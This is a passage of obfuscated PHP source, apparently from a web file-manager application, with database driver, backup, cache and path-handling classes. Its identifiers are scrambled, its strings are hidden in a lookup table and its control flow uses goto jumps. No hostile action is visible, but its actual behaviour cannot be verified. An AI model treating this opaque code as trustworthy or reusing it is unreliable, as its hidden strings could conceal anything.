$øÑ¨×ÌŠ[996]; } else { $ëôâ¥ = $øÑ¨×ÌŠ[997]; } $ÅÔ–ŠÖ´ = $this->query($ëôâ¥); $û“ê±á = array(); foreach ($ÅÔ–ŠÖ´ as $‘Üà±¶º => $¥‚âçøé) { $û“ê±á[$‘Üà±¶º] = current($¥‚âçøé); } return $û“ê±á; } public function replace($…Ã§¬†™, $¢›İÏ¨Í = array()) { $¯ıâ‹Ÿò =& $_SERVER[¯‘·½]; foreach ($…Ã§¬†™ as $Ï‚ßßê© => $Î÷´ÃªÔ) { $‰¤ÈÄ‰ = $this->parseValue($Î÷´ÃªÔ); if (is_scalar($‰¤ÈÄ‰)) { $»Œ™îîÌ[] = $‰¤ÈÄ‰; $æ¼¸ÀÀ[] = $this->parseKey($Ï‚ßßê©); } } $£ñ§îÂ = $¯ıâ‹Ÿò[998] . $this->parseTable($¢›İÏ¨Í[$¯ıâ‹Ÿò[359]]) . $¯ıâ‹Ÿò[999] . implode($¯ıâ‹Ÿò[50], $æ¼¸ÀÀ) . $¯ıâ‹Ÿò[1000] . implode($¯ıâ‹Ÿò[50], $»Œ™îîÌ) . $¯ıâ‹Ÿò[1001]; return $this->execute($£ñ§îÂ); } public function insertAll($÷æŒå‹, $²¾Ë‹ãŒ = array(), $Ë´£ÂÏÜ = false) { $¹Ï˜…½ =& $_SERVER[¯‘·½]; if (!is_array($÷æŒå‹[0])) { return !1; } $ÆÓ¹÷ú™ = array_keys($÷æŒå‹[0]); $ïİÄ‡§Ç = array(); foreach ($÷æŒå‹ as $ì„çÜåé) { $€ªŒÏ¡Í = array(); foreach ($ì„çÜåé as $…«°Ë¥ => $ËÍÇ¬‡§) { $ËÍÇ¬‡§ = $this->parseValue($ËÍÇ¬‡§); if (is_scalar($ËÍÇ¬‡§)) { $€ªŒÏ¡Í[] = $ËÍÇ¬‡§; } } $ïİÄ‡§Ç[] = $¹Ï˜…½[340] . implode($¹Ï˜…½[50], $€ªŒÏ¡Í) . $¹Ï˜…½[1001]; } array_walk($ÆÓ¹÷ú™, array($this, $¹Ï˜…½[1002])); $«–Â“€ = ($Ë´£ÂÏÜ ? $¹Ï˜…½[1003] : $¹Ï˜…½[1004]) . $¹Ï˜…½[1005] . $this->parseTable($²¾Ë‹ãŒ[$¹Ï˜…½[359]]) . $¹Ï˜…½[999] . implode($¹Ï˜…½[50], $ÆÓ¹÷ú™) . $¹Ï˜…½[1006] . implode($¹Ï˜…½[50], $ïİÄ‡§Ç); return $this->execute($«–Â“€); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $‘ğ¾µŸí =& $_SERVER[¯‘·½]; $this->error = mysql_errno() . $‘ğ¾µŸí[4] . mysql_error($this->_linkID); if ($‘ğ¾µŸí[12] != $this->queryStr) { $this->error .= LNG($‘ğ¾µŸí[48]) . $this->queryStr; } think_trace($this->error, $‘ğ¾µŸí[12], $‘ğ¾µŸí[49]); return $this->error; } public function escapeString($§¦øœ®É) { if ($this->_linkID) { return mysql_real_escape_string($§¦øœ®É, $this->_linkID); } else { return mysql_escape_string($§¦øœ®É); } } public function parseKey(&$š±ÜòÜğ, $İºÕ’™° = true) { $¼±óŒê€ =& $_SERVER[¯‘·½]; if ($İºÕ’™°) { $š±ÜòÜğ = $this->parseKeyCheck($š±ÜòÜğ); } if ($š±ÜòÜğ != $¼±óŒê€[223] && !preg_match($¼±óŒê€[1007], $š±ÜòÜğ)) { $š±ÜòÜğ = $¼±óŒê€[463] . trim($š±ÜòÜğ, $¼±óŒê€[463]) . $¼±óŒê€[463]; } return $š±ÜòÜğ; } } class DbMysqli extends Db { public function __construct($›ŞÏà“› = '') { $Ôûğ…Á =& $_SERVER[¯‘·½]; if (!extension_loaded($Ôûğ…Á[1008])) { think_exception(think_lang($Ôûğ…Á[14]) . $Ôûğ…Á[1009]); } if (!empty($›ŞÏà“›)) { $this->config = $›ŞÏà“›; if (empty($this->config[$Ôûğ…Á[17]])) { $this->config[$Ôûğ…Á[17]] = $Ôûğ…Á[12]; } } } public function connect($ÑŒ€”£” = '', $àÌäíŞ— = 0) { $»Å€ƒŞ =& $_SERVER[¯‘·½]; if (!isset($this->linkID[$àÌäíŞ—])) { if (empty($ÑŒ€”£”)) { $ÑŒ€”£” = $this->config; } $this->linkID[$àÌäíŞ—] = new mysqli($ÑŒ€”£”[$»Å€ƒŞ[982]], $ÑŒ€”£”[$»Å€ƒŞ[984]], $ÑŒ€”£”[$»Å€ƒŞ[985]], $ÑŒ€”£”[$»Å€ƒŞ[21]], $ÑŒ€”£”[$»Å€ƒŞ[983]] ? intval($ÑŒ€”£”[$»Å€ƒŞ[983]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $’î©Æôà = $this->linkID[$àÌäíŞ—]->server_version; $this->linkID[$àÌäíŞ—]->query($»Å€ƒŞ[986] . think_config($»Å€ƒŞ[987]) . $»Å€ƒŞ[58]); if ($’î©Æôà > $»Å€ƒŞ[988]) { $this->linkID[$àÌäíŞ—]->query($»Å€ƒŞ[989]); } $this->connected = !0; if (1 != think_config($»Å€ƒŞ[22])) { unset($this->config); } } return $this->linkID[$àÌäíŞ—]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($‚İ¦·) { $œíæó¯ =& $_SERVER[¯‘·½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‚İ¦·; if ($this->queryID) { $this->free(); } think_action_status($œíæó¯[23], 1); think_status($œíæó¯[24]); $this->queryID = $this->_linkID->query($‚İ¦·); if ($this->_linkID->more_results()) { while (($ùû¥¨®« = $this->_linkID->next_result()) != NULL) { $ùû¥¨®«->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ü¹Àé«á) { $òƒæò±ø =& $_SERVER[¯‘·½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ü¹Àé«á; if ($this->queryID) { $this->free(); } think_action_status($òƒæò±ø[25], 1); think_status($òƒæò±ø[24]); $®€…ÈÄô = $this->_linkID->query($ü¹Àé«á); $this->debug(); if (!1 === $®€…ÈÄô) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÁˆíïÕ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÁˆíïÕ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Äµ˜Æü¾ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Äµ˜Æü¾) { $this->error(); return !1; } } return !0; } private function getAll() { $µÑÌ£ı = array(); if ($this->numRows > 0) { for ($ºÉøØ³Œ = 0; $ºÉøØ³Œ < $this->numRows; $ºÉøØ³Œ++) { $µÑÌ£ı[$ºÉøØ³Œ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $µÑÌ£ı; } public function getFields($Íƒİ€€) { $Öª“á• =& $_SERVER[¯‘·½]; $¨°­Å“Œ = $this->query($Öª“á•[993] . $this->parseKey($Íƒİ€€)); $£å£´ÃÜ = array(); if ($¨°­Å“Œ) { foreach ($¨°­Å“Œ as $¸è”·ê³ => $í–»Ğˆ) { $£å£´ÃÜ[$í–»Ğˆ[$Öª“á•[31]]] = array($Öª“á•[32] => $í–»Ğˆ[$Öª“á•[31]], $Öª“á•[33] => $í–»Ğˆ[$Öª“á•[34]], $Öª“á•[35] => (bool) ($í–»Ğˆ[$Öª“á•[36]] === $Öª“á•[12]), $Öª“á•[37] => $í–»Ğˆ[$Öª“á•[38]], $Öª“á•[39] => strtolower($í–»Ğˆ[$Öª“á•[40]]) == $Öª“á•[41], $Öª“á•[42] => strtolower($í–»Ğˆ[$Öª“á•[43]]) == $Öª“á•[44]); } } return $£å£´ÃÜ; } public function getTables($Á£éóš = '') { $ˆ¤Õİ“û =& $_SERVER[¯‘·½]; $ßæ€ÁÕÛ = !empty($Á£éóš) ? $ˆ¤Õİ“û[995] . $Á£éóš . $ˆ¤Õİ“û[996] : $ˆ¤Õİ“û[997]; $¸¤ ÖÉø = $this->query($ßæ€ÁÕÛ); $°¶ÌÈÆ¢ = array(); if ($¸¤ ÖÉø) { foreach ($¸¤ ÖÉø as $Õ‰ø¥ğ­ => $±íƒĞõ) { $°¶ÌÈÆ¢[$Õ‰ø¥ğ­] = current($±íƒĞõ); } } return $°¶ÌÈÆ¢; } public function replace($ø¶º¾¦, $ÇËİß = array()) { $è˜İœ« =& $_SERVER[¯‘·½]; foreach ($ø¶º¾¦ as $‹¬Ã’Êñ => $ıŠ—‰ŸÜ) { $ÏšîÕá = $this->parseValue($ıŠ—‰ŸÜ); if (is_scalar($ÏšîÕá)) { $æÌ‚‰ÔË[] = $ÏšîÕá; $Ôãù¡¡¬[] = $this->parseKey($‹¬Ã’Êñ); } } $®…¹¾œ = $è˜İœ«[998] . $this->parseTable($ÇËİß[$è˜İœ«[359]]) . $è˜İœ«[999] . implode($è˜İœ«[50], $Ôãù¡¡¬) . $è˜İœ«[1000] . implode($è˜İœ«[50], $æÌ‚‰ÔË) . $è˜İœ«[1001]; return $this->execute($®…¹¾œ); } public function insertAll($©Û æ¥Õ, $ƒ£ê›ëô = array(), $ƒ¥ÅÈì¦ = false) { $ºßöşã÷ =& $_SERVER[¯‘·½]; if (!is_array($©Û æ¥Õ[0])) { return !1; } $ğ¸çÉ‰¦ = array_keys($©Û æ¥Õ[0]); $§Ííö = array(); foreach ($©Û æ¥Õ as $Ö§¸¡ìÁ) { $ëâØÚîÃ = array(); foreach ($Ö§¸¡ìÁ as $ğ‡¤ü€ï => $®¬·ğ“) { $®¬·ğ“ = $this->parseValue($®¬·ğ“); if (is_scalar($®¬·ğ“)) { $ëâØÚîÃ[] = $®¬·ğ“; } } $§Ííö[] = $ºßöşã÷[340] . implode($ºßöşã÷[50], $ëâØÚîÃ) . $ºßöşã÷[1001]; } array_walk($ğ¸çÉ‰¦, array($this, $ºßöşã÷[1002])); $‘†‹ä´ = $ƒ¥ÅÈì¦ ? $ºßöşã÷[1003] : $ºßöşã÷[1004]; $Ò¤ªÈ¬û = $‘†‹ä´ . $ºßöşã÷[1005] . $this->parseTable($ƒ£ê›ëô[$ºßöşã÷[359]]) . $ºßöşã÷[999] . implode($ºßöşã÷[50], $ğ¸çÉ‰¦) . $ºßöşã÷[1006] . implode($ºßöşã÷[50], $§Ííö); return $this->execute($Ò¤ªÈ¬û); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¦ãœû– =& $_SERVER[¯‘·½]; $this->error = $this->_linkID->errno . $¦ãœû–[4] . $this->_linkID->error; if ($¦ãœû–[12] != $this->queryStr) { $this->error .= LNG($¦ãœû–[48]) . $this->queryStr; } think_trace($this->error, $¦ãœû–[12], $¦ãœû–[49]); return $this->error; } public function escapeString($³Ø„Ä÷É) { if ($this->_linkID) { return $this->_linkID->real_escape_string($³Ø„Ä÷É); } else { return addslashes($³Ø„Ä÷É); } } public function parseKey(&$ÄæÙµÉÛ, $è„áÀöô = true) { $õ”å€Îİ =& $_SERVER[¯‘·½]; if ($è„áÀöô) { $ÄæÙµÉÛ = $this->parseKeyCheck($ÄæÙµÉÛ); } if ($ÄæÙµÉÛ != $õ”å€Îİ[223] && !preg_match($õ”å€Îİ[1007], $ÄæÙµÉÛ)) { $ÄæÙµÉÛ = $õ”å€Îİ[463] . trim($ÄæÙµÉÛ, $õ”å€Îİ[463]) . $õ”å€Îİ[463]; } return $ÄæÙµÉÛ; } } goto AÌ©ºÖ„™Ş; F»ù¢™µ—º: define($_SERVER[¯‘·½][320], 3); define($_SERVER[¯‘·½][321], 1); define($_SERVER[¯‘·½][322], 0); goto e‚¾æÂˆŠĞ; Eª¼ƒÈÈĞï: class BackupDbFile { public function __construct() { } public function index() { $û‹úñ­‚ =& $_SERVER[¯‘·½]; $­·›¬¬ä = Backup::get(); $İíÈØÃò = $­·›¬¬ä[$û‹úñ­‚[32]]; $ò°‰›Äø = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\160\x5f{$İíÈØÃò}\57"; $ÖÆ“±» = $this->backupPath($­·›¬¬ä); if (!($ÖÆ“±» = IO::mkdir($ÖÆ“±»))) { Backup::log($û‹úñ­‚[886] . $ÖÆ“±»); return !1; } $¤úÀÅæ = IO::listPath($ò°‰›Äø); $˜¡ù–ä¡ = isset($¤úÀÅæ[$û‹úñ­‚[86]]) ? $¤úÀÅæ[$û‹úñ­‚[86]] : array(); $÷Õ‰İ®® = array_sum(array_column($˜¡ù–ä¡, $û‹úñ­‚[79])); if (!$÷Õ‰İ®®) { Backup::log($û‹úñ­‚[887] . $ò°‰›Äø); return !1; } $ÙÔùÙ˜º = array($û‹úñ­‚[888] => $÷Õ‰İ®®, $û‹úñ­‚[889] => time()); Backup::set($ÙÔùÙ˜º); $°şáĞø× = new TaskFileTransfer($û‹úñ­‚[890], $û‹úñ­‚[863], count($˜¡ù–ä¡), LNG($û‹úñ­‚[872]) . $û‹úñ­‚[464] . LNG($û‹úñ­‚[874]) . $û‹úñ­‚[891]); $°şáĞø×->task[$û‹úñ­‚[849]] = $÷Õ‰İ®®; foreach ($¤úÀÅæ[$û‹úñ­‚[86]] as $—Ñã÷‘–) { $À½©šäê = IO::move($—Ñã÷‘–[$û‹úñ­‚[87]], $ÖÆ“±»); if (!$À½©šäê) { $°şáĞø×->end(); $òÕ·¹—Û = IO::getLastError($û‹úñ­‚[892] . $—Ñã÷‘–[$û‹úñ­‚[87]] . $û‹úñ­‚[893] . $ÖÆ“±» . $û‹úñ­‚[178]); Backup::log($òÕ·¹—Û); return !1; } } $¹òå‰Şì = new DbManage(); $¯«¶‰÷à = $¹òå‰Şì->getSqlFile(); if (!$¯«¶‰÷à || !$¯«¶‰÷à[$û‹úñ­‚[894]] || !$¯«¶‰÷à[$û‹úñ­‚[13]]) { Backup::log($û‹úñ­‚[895]); return !1; } IO::move($¯«¶‰÷à[$û‹úñ­‚[894]], $ÖÆ“±»); IO::move($¯«¶‰÷à[$û‹úñ­‚[13]], $ÖÆ“±»); $°şáĞø×->end(); $ÙÔùÙ˜º = array($û‹úñ­‚[896] => $÷Õ‰İ®®, $û‹úñ­‚[897] => time()); Backup::set($ÙÔùÙ˜º); return !0; } private function backupPath($Ñì¶ã€’) { $Î¾É‰™• =& $_SERVER[¯‘·½]; $ãğ¼¼„æ = $Ñì¶ã€’[$Î¾É‰™•[32]]; $™é÷€çı = Model($Î¾É‰™•[856])->get($Î¾É‰™•[857]); $¦·ï€Ê˜ = substr(md5($Î¾É‰™•[858] . $™é÷€çı . $ãğ¼¼„æ), 0, 8); return "\173\x69\x6f\72{$Ñì¶ã€’[$Î¾É‰™•[837]]}\x7d\57\144\141\x74\141\142\x61\163\145\57\x62\141\143\x6b\x75\x70\x2f" . $ãğ¼¼„æ . $Î¾É‰™•[11] . $¦·ï€Ê˜; } private function tmpFilesPath() { $€Ï¸„ßÛ =& $_SERVER[¯‘·½]; $ãßƒ† = TEMP_FILES; if ($GLOBALS[$€Ï¸„ßÛ[6]][$€Ï¸„ßÛ[92]][$€Ï¸„ßÛ[884]]) { $ãßƒ† = $GLOBALS[$€Ï¸„ßÛ[6]][$€Ï¸„ßÛ[92]][$€Ï¸„ßÛ[884]]; if (!mk_dir($ãßƒ†) || !is_writable($ãßƒ†) || !IO::mkfile($ãßƒ† . $€Ï¸„ßÛ[885])) { $ãßƒ† = TEMP_FILES; } } return $ãßƒ†; } } class BackupFile { public function __construct() { } public function index() { $¿´±ƒ÷Ÿ = Backup::get(); $µ ÎìÎ = $¿´±ƒ÷Ÿ[$_SERVER[¯‘·½][841]][$_SERVER[¯‘·½][233]][$_SERVER[¯‘·½][545]]; $¶í²Ô = array($_SERVER[¯‘·½][546] => array($_SERVER[¯‘·½][898], $µ ÎìÎ), $_SERVER[¯‘·½][899] => array($_SERVER[¯‘·½][408], $¿´±ƒ÷Ÿ[$_SERVER[¯‘·½][837]])); $óŸõóÕŒ = (int) Model($_SERVER[¯‘·½][877])->where($¶í²Ô)->count($_SERVER[¯‘·½][545]); $ÛÁáà ¬ = (int) Model($_SERVER[¯‘·½][877])->where($¶í²Ô)->sum($_SERVER[¯‘·½][79]); $ıµÃ¨ÖÍ = new TaskFileTransfer($_SERVER[¯‘·½][900], $_SERVER[¯‘·½][863], $óŸõóÕŒ, LNG($_SERVER[¯‘·½][872]) . $_SERVER[¯‘·½][873] . LNG($_SERVER[¯‘·½][901])); $ıµÃ¨ÖÍ->task[$_SERVER[¯‘·½][849]] = $ÛÁáà ¬; $ÆŸïÁŸ… = array($_SERVER[¯‘·½][902] => $óŸõóÕŒ, $_SERVER[¯‘·½][903] => $ÛÁáà ¬, $_SERVER[¯‘·½][904] => time()); Backup::set($ÆŸïÁŸ…); $­ÄªëÙ× = !0; $ñ¥¡£Õ = $this->storeIds(); $ôœéã¹ü = 1; $½Åáıß± = 1000; $¸öªÅŸ” = $ƒÙ•ß·‡ = 0; $ş€¬úŸÉ = array(); $©¹Æ„Ö = $¹»ºõ÷… = 0; do { $ŠÉ’©Á• = $_SERVER[¯‘·½][905]; $·ªÄØŠÌ = Model($_SERVER[¯‘·½][877])->where($¶í²Ô)->field($ŠÉ’©Á•)->order($_SERVER[¯‘·½][906])->selectPage($½Åáıß±, $ôœéã¹ü); $”ıÇù­Ç = !empty($·ªÄØŠÌ[$_SERVER[¯‘·½][447]]) ? $·ªÄØŠÌ[$_SERVER[¯‘·½][447]] : array(); foreach ($”ıÇù­Ç as $°ÃĞ§¼) { if (!$this->_fileExist($°ÃĞ§¼, $ş€¬úŸÉ, $ñ¥¡£Õ)) { Backup::log($_SERVER[¯‘·½][907] . $°ÃĞ§¼[$_SERVER[¯‘·½][545]] . $_SERVER[¯‘·½][908] . $°ÃĞ§¼[$_SERVER[¯‘·½][87]]); continue; } $­ƒ°µ«û = $°ÃĞ§¼[$_SERVER[¯‘·½][87]]; $•¢ŠïÏ† = "\173\151\x6f\72{$¿´±ƒ÷Ÿ[$_SERVER[¯‘·½][837]]}\x7d" . substr($­ƒ°µ«û, strlen("\x7b\x69\157\x3a{$°ÃĞ§¼[$_SERVER[¯‘·½][909]]}\175")); if (IO::exist($•¢ŠïÏ†)) { $ıµÃ¨ÖÍ->updateFileEnd($°ÃĞ§¼[$_SERVER[¯‘·½][32]], $°ÃĞ§¼[$_SERVER[¯‘·½][79]]); } else { $•¢ŠïÏ† = get_path_father($•¢ŠïÏ†); IO::mkdir($•¢ŠïÏ†); if (!IO::copy($­ƒ°µ«û, $•¢ŠïÏ†, $_SERVER[¯‘·½][910])) { Backup::log($_SERVER[¯‘·½][911] . $­ƒ°µ«û . $_SERVER[¯‘·½][893] . $•¢ŠïÏ† . $_SERVER[¯‘·½][178]); $­ÄªëÙ× = !1; break; } } $µ ÎìÎ = $°ÃĞ§¼[$_SERVER[¯‘·½][545]]; $ƒÙ•ß·‡ += 1; $¸öªÅŸ” += $°ÃĞ§¼[$_SERVER[¯‘·½][79]]; $¹»ºõ÷… += 1; $©¹Æ„Ö += $°ÃĞ§¼[$_SERVER[¯‘·½][79]]; if ($¸öªÅŸ” >= 1024 * 1024 * 100) { $ÆŸïÁŸ… = array($_SERVER[¯‘·½][836] => $µ ÎìÎ, $_SERVER[¯‘·½][912] => $¹»ºõ÷…, $_SERVER[¯‘·½][913] => $©¹Æ„Ö); Backup::set($ÆŸïÁŸ…); $¸öªÅŸ” = $ƒÙ•ß·‡ = 0; } } $ƒ½øª«ì = count($”ıÇù­Ç); $ôœéã¹ü++; } while ($ƒ½øª«ì == $½Åáıß±); $ıµÃ¨ÖÍ->end(); $ÆŸïÁŸ… = array($_SERVER[¯‘·½][914] => 1, $_SERVER[¯‘·½][847] => time(), $_SERVER[¯‘·½][861] => 1, $_SERVER[¯‘·½][836] => $µ ÎìÎ, $_SERVER[¯‘·½][915] => time()); if ($ƒÙ•ß·‡) { $ÆŸïÁŸ…[$_SERVER[¯‘·½][912]] = $¹»ºõ÷…; $ÆŸïÁŸ…[$_SERVER[¯‘·½][913]] = $©¹Æ„Ö; } Backup::set($ÆŸïÁŸ…); return !0; } private function _fileExist($ÓŒÁ§Ìµ, &$Î¡äö™Å, $ƒ¾Èõ•Ó) { $Á’™×³ =& $_SERVER[¯‘·½]; $Âƒüş»ø = $ÓŒÁ§Ìµ[$Á’™×³[87]]; if (in_array($ÓŒÁ§Ìµ[$Á’™×³[545]], $Î¡äö™Å)) { return !1; } if (!in_array($ÓŒÁ§Ìµ[$Á’™×³[909]], $ƒ¾Èõ•Ó)) { return !1; } if (IO::exist($Âƒüş»ø)) { return !0; } $øÒò¤ò¯ = get_path_father($Âƒüş»ø); if (IO::exist($øÒò¤ò¯)) { $Î¡äö™Å[] = $ÓŒÁ§Ìµ[$Á’™×³[545]]; return !1; } $ï‹ËáÃˆ = array($Á’™×³[909] => $ÓŒÁ§Ìµ[$Á’™×³[909]], $Á’™×³[87] => array($Á’™×³[461], "{$øÒò¤ò¯}\x25")); $ÂÉ‚¼ëõ = Model($Á’™×³[877])->where($ï‹ËáÃˆ)->field($Á’™×³[546])->select(); $Î¡äö™Å = array_merge($Î¡äö™Å, array_to_keyvalue($ÂÉ‚¼ëõ, $Á’™×³[12], $Á’™×³[545])); return !1; } private function _fileFilter($§Ñá€ó£) { $µ»ªÍÑ¦ =& $_SERVER[¯‘·½]; return; if (empty($§Ñá€ó£)) { return; } $Õø˜«ôÖ = array($µ»ªÍÑ¦[545] => array($µ»ªÍÑ¦[7], array_unique($§Ñá€ó£))); $¼Šü°Ìî = Model($µ»ªÍÑ¦[916])->where($Õø˜«ôÖ)->field($µ»ªÍÑ¦[194])->select(); foreach ($¼Šü°Ìî as $´í†áñ¦) { Model($µ»ªÍÑ¦[916])->remove($´í†áñ¦[$µ»ªÍÑ¦[194]], !1); } } private function storeIds() { $ıŠî™‘ =& $_SERVER[¯‘·½]; $Ğ¤… ½à = Model($ıŠî™‘[853])->listData(); $óêË“Ê = array(); $±Ô¶Éö = $GLOBALS[$ıŠî™‘[6]][$ıŠî™‘[92]][$ıŠî™‘[917]]; foreach ($Ğ¤… ½à as $’–ËÆ×) { $™Ëñ§ª = strtolower($’–ËÆ×[$ıŠî™‘[98]]); if (!isset($±Ô¶Éö[$™Ëñ§ª])) { continue; } $”¡ìÒ×æ = $ıŠî™‘[77] . (isset($±Ô¶Éö[$™Ëñ§ª]) ? $±Ô¶Éö[$™Ëñ§ª] : ucfirst($™Ëñ§ª)); if (!class_exists($”¡ìÒ×æ)) { continue; } $óêË“Ê[] = $’–ËÆ×[$ıŠî™‘[477]]; } return $óêË“Ê; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ø¦¼à£ =& $_SERVER[¯‘·½]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $İ÷™Ä¶ø = $GLOBALS[$ø¦¼à£[6]][$ø¦¼à£[426]]; $Ù‹öë‰Å = $İ÷™Ä¶ø[$İ÷™Ä¶ø[$ø¦¼à£[918]]]; $ø‚Ë¸¢È = $İ÷™Ä¶ø[$ø¦¼à£[919]]; switch ($İ÷™Ä¶ø[$ø¦¼à£[918]]) { case $ø¦¼à£[21]: self::$handle = Model($ø¦¼à£[920]); break; case $ø¦¼à£[921]: self::$handle = new CacheRedis($Ù‹öë‰Å, $ø‚Ë¸¢È); break; case $ø¦¼à£[922]: self::$handle = new CacheMemcached($Ù‹öë‰Å, $ø‚Ë¸¢È); break; case $ø¦¼à£[233]: self::$handle = new CacheFile($Ù‹öë‰Å, $ø‚Ë¸¢È); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($³‘¦ñ‚§) { if (is_array($³‘¦ñ‚§) || is_object($³‘¦ñ‚§)) { $³‘¦ñ‚§ = json_encode($³‘¦ñ‚§); } $³‘¦ñ‚§ = rawurlencode($³‘¦ñ‚§); return md5(KOD_SITE_ID . $_SERVER[¯‘·½][11] . $³‘¦ñ‚§); } public static function get($òÃı÷ªá, $†¹ñ…ò = false) { $„âÏÀ¬Â = self::key($òÃı÷ªá); $İšö¾ƒ = self::init(); if ($†¹ñ…ò) { return unserialize($İšö¾ƒ->get($„âÏÀ¬Â)); } if (!isset(self::$memoryCache[$„âÏÀ¬Â])) { $æ³©ñ = $İšö¾ƒ->get($„âÏÀ¬Â); self::$memoryCache[$„âÏÀ¬Â] = unserialize($æ³©ñ); } return self::$memoryCache[$„âÏÀ¬Â]; } public static function set($Ô¸çÌÇ¾, $õºüùüÏ, $ğã­¨ĞÉ = false) { $˜°‘¹²İ =& $_SERVER[¯‘·½]; $¦˜’À = self::key($Ô¸çÌÇ¾); if (isset(self::$memoryCache[$¦˜’À]) && self::$memoryCache[$¦˜’À] === $õºüùüÏ) { return !0; } if ($ğã­¨ĞÉ === 0) { self::$memoryCache[$¦˜’À] = $õºüùüÏ; return !0; } $¹†ÍÂ­ = self::init(); $’”ùàĞ§ = serialize($õºüùüÏ); CacheLock::lock($Ô¸çÌÇ¾ . $˜°‘¹²İ[923]); $åÙ ÏÏ = $¹†ÍÂ­->set($¦˜’À, $’”ùàĞ§, $ğã­¨ĞÉ); self::$memoryCache[$¦˜’À] = $õºüùüÏ; CacheLock::unlock($Ô¸çÌÇ¾ . $˜°‘¹²İ[923]); return $åÙ ÏÏ; } public static function getCall($ÃÙÆ§Üı, $äœ‰­âÅ, $­íı…ƒ, $å•‰ºÈ¨ = array()) { $Ï´ñÓÒ =& $_SERVER[¯‘·½]; $Ö¾ïÈ‚ = self::get($ÃÙÆ§Üı); if ($Ö¾ïÈ‚ || $Ö¾ïÈ‚ === $Ï´ñÓÒ[12]) { return $Ö¾ïÈ‚; } $Ö¾ïÈ‚ = call_user_func_array($­íı…ƒ, $å•‰ºÈ¨); $Ö¾ïÈ‚ = $Ö¾ïÈ‚ ? $Ö¾ïÈ‚ : $Ï´ñÓÒ[12]; self::set($ÃÙÆ§Üı, $Ö¾ïÈ‚, $äœ‰­âÅ); return $Ö¾ïÈ‚; } public static function remove($©¤’áÆí) { $‡Úéë = self::key($©¤’áÆí); unset(self::$memoryCache[$‡Úéë]); self::clearTimeout(); CacheLock::lock($©¤’áÆí); $ìˆññ¤å = self::init()->remove($‡Úéë); CacheLock::unlock($©¤’áÆí); return $ìˆññ¤å; } public static function removeMemory($¾’ö™îË) { $¦¤§úÇ÷ = self::key($¾’ö™îË); unset(self::$memoryCache[$¦¤§úÇ÷]); } public static function clearMemory($âµÍµ = false) { if ($âµÍµ) { $âµÍµ = self::key($âµÍµ); unset(self::$memoryCache[$âµÍµ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¯‘·½][924])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¯‘·½][925])) { self::init()->clearTimeout(); } } } goto bÊÀŒ„Ó·â; c«ŠÙœ×ÇÌ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¢‹“ÂÖ¥) { $this->pathParse = $¢‹“ÂÖ¥; $this->model = Model($_SERVER[¯‘·½][1452]); } public function getPath($‘í×¸ˆÜ) { return trim($‘í×¸ˆÜ, $_SERVER[¯‘·½][8]); } public function pathFather($ûøšç¼Ä) { $·Ÿö®ëÃ = $this->parse($ûøšç¼Ä); $·Ÿö®ëÃ = $this->infoSimple($ûøšç¼Ä); return $·Ÿö®ëÃ ? $·Ÿö®ëÃ[$_SERVER[¯‘·½][193]] : !1; } public function pathThis($èô¹…Éë) { $¡Ó²¢€ = $this->infoSimple($èô¹…Éë); return $¡Ó²¢€ ? $¡Ó²¢€[$_SERVER[¯‘·½][32]] : !1; } public function getPathOuter($Ìæ˜´û÷) { if (!$Ìæ˜´û÷) { return $Ìæ˜´û÷; } $ ¿´¨Ò¼ = $this->parse($Ìæ˜´û÷); return KodIO::make($ ¿´¨Ò¼[$_SERVER[¯‘·½][477]]); } public function copyFolderFromIO($¥¬ŒË¤Æ, $…„™ÆØ¨, $˜‡ÃÇú¨, $öµ‚ß®, $ï¶¾è¿“) { $†Ø´Î† = $this->model->copyFolderFromIO($¥¬ŒË¤Æ, $…„™ÆØ¨, $˜‡ÃÇú¨, $öµ‚ß®, $ï¶¾è¿“); return KodIO::make($†Ø´Î†); } public function isParentOf($Ş¯ªşâó, $üÊá·Ã¼) { return $this->model->isParentOf($Ş¯ªşâó, $üÊá·Ã¼); } public function mkfile($–ŠºÒ¬, $äŞ¶‰ø¯ = '', $ÛäÒıÊ“ = REPEAT_RENAME) { $ì®–ˆ¤¢ =& $_SERVER[¯‘·½]; $ïğíÆ˜ = $this->parse($–ŠºÒ¬); $–ŠºÒ¬ = $ïğíÆ˜[$ì®–ˆ¤¢[477]]; for ($™ƒíÛé = 0; $™ƒíÛé < count($ïğíÆ˜[$ì®–ˆ¤¢[1453]]); $™ƒíÛé++) { $‘’çÚ = $ïğíÆ˜[$ì®–ˆ¤¢[1453]][$™ƒíÛé]; if ($™ƒíÛé == count($ïğíÆ˜[$ì®–ˆ¤¢[1453]]) - 1) { $–ŠºÒ¬ = $this->model->mkfile($–ŠºÒ¬, $‘’çÚ, $äŞ¶‰ø¯, $ÛäÒıÊ“); break; } $–ŠºÒ¬ = $this->model->mkdir($–ŠºÒ¬, $‘’çÚ, REPEAT_SKIP); } return 